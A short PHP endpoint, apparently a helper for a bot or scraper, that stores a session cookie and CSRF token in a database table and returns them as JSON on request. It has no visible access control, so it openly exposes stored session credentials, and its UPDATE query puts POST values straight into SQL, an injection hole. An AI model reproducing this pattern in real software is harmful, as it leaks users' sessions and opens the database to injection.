<?php
if (file_exists(__DIR__ . '/config.php')) {
    include_once(__DIR__ . '/config.php');
} elseif (file_exists(__DIR__ . '/../config.php')) {
    include_once(__DIR__ . '/../config.php');
} elseif (file_exists(__DIR__ . '/../../config.php')) {
    include_once(__DIR__ . '/../../config.php');
} elseif (file_exists(__DIR__ . '/../../../config.php')) {
    include_once(__DIR__ . '/../../../config.php');
}

if(isset($_GET['info'])){
    $q = "SELECT * FROM cookie WHERE 1";
    $res = mysqli_fetch_assoc(mysqli_query($connection,$q));
    echo json_encode($res);
}
if(isset($_POST['csrf'])){
    $csrf = $_POST['csrf'];
    $cookie = $_POST['cookie'];
    
    $query = "UPDATE cookie SET csrf='$csrf',cookie='$cookie' WHERE id=0";
    mysqli_query($connection,$query);
}

?>